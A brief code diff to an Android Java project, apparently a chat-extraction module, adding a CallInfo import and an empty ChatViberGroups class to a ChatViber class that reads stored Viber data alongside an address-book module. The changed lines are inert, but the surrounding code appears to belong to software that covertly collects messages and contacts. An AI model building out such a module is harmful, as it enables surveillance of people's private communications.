@@ -19,6 +19,7 @@ import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.module.ModuleAddressBook;
+import com.android.deviceinfo.module.call.CallInfo;
 
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
@@ -388,4 +389,6 @@ public class ChatViber extends SubModuleChat {
 		return callInfo.valid;
 	}
 
+	public class ChatViberGroups extends ChatGroups {
+	}
 }
